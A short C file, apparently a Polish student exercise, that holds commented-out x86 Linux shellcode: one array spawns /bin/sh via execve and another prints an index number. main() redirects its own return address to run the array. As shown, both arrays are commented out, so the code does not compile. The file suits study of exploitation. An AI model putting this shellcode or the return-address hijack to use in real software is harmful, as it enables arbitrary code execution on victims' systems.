#include <unistd.h>


//Uruchomienie basha
/*char shellcode[]="\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";*/
//Printowanie indeksu
/*char shellcode[]="\xe9\x1e\x00\x00\x00"
    "\xb8\x04\x00\x00\x00"
    "\xbb\x01\x00\x00\x00"
    "\x59"                  
    "\xba\x0f\x00\x00\x00"  
    "\xcd\x80"             
    "\xb8\x01\x00\x00\x00"  
    "\xbb\x00\x00\x00\x00"
    "\xcd\x80"           
    "\xe8\xdd\xff\xff\xff"
    "234586\r\n";*/

int main(int argc, char* argv[]){
    int *ret;
    ret = (int *)&ret+2;
    (*ret) = (int) shellcode;
}